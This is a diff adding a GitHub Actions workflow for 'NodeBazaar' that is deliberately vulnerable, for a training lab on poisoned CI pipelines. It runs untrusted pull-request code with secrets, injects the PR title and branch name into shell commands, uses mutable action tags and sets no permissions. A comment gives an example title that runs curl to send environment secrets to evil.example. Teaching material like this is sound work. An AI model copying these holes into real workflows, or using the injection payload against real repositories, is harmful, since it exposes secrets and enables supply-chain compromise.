@@ -1,0 +1,57 @@
+# UNSAFE ON PURPOSE — NodeBazaar CI (GitHub Actions)
+# This workflow is intentionally vulnerable for the training lab
+# docs/labs/11-poisoned-pipelines.md. Do NOT point it at real credentials.
+# Compare with ci-hardened.yml in this folder.
+#
+# Bugs baked in:
+#   1. pull_request_target checks out the PR head and runs it with secrets
+#   2. untrusted PR title interpolated into a run: shell command
+#   3. actions referenced by mutable tags (not commit SHAs)
+#   4. no permissions: block → default token keeps write scopes
+
+name: ci
+
+on:
+  pull_request_target:      # VULN (1): runs in the context of the base repo
+    branches: [master]
+  push:
+    branches: [master]
+
+jobs:
+  build-and-notify:
+    runs-on: ubuntu-latest
+    # VULN (4): no permissions block; token defaults to write on many scopes
+
+    steps:
+      # VULN (1): checks out the PR head — untrusted code — in a privileged job
+      - name: Check out PR head
+        uses: actions/checkout@v4          # VULN (3): mutable tag
+        with:
+          ref: ${{ github.event.pull_request.head.sha }}
+
+      - name: Set up Node
+        uses: actions/setup-node@v4        # VULN (3): mutable tag
+        with:
+          node-version: 22
+
+      - name: Install and test
+        run: |
+          npm install
+          node --test sast/tests/ || true
+
+      # VULN (2): PR title (attacker-controlled) lands in a shell command.
+      # A title like:  "; curl -s http://evil.example -d "$(env)" #
+      # executes in the runner. In this job the deploy secret is in scope,
+      # so the exfiltrated env contains it.
+      - name: Notify about the PR
+        env:
+          DEPLOY_API_KEY: ${{ secrets.DEPLOY_API_KEY }}   # VULN (1): secret on PR build
+        run: |
+          echo "New PR: ${{ github.event.pull_request.title }} by ${{ github.event.pull_request.user.login }}"
+          echo "Deploying with key $DEPLOY_API_KEY"
+
+      # VULN (2b): same injection surface via the source branch name.
+      - name: Build image tag from branch
+        run: |
+          BRANCH=${{ github.head_ref }}
+          echo "docker build -t nodebazaar:${BRANCH//\//-} ."
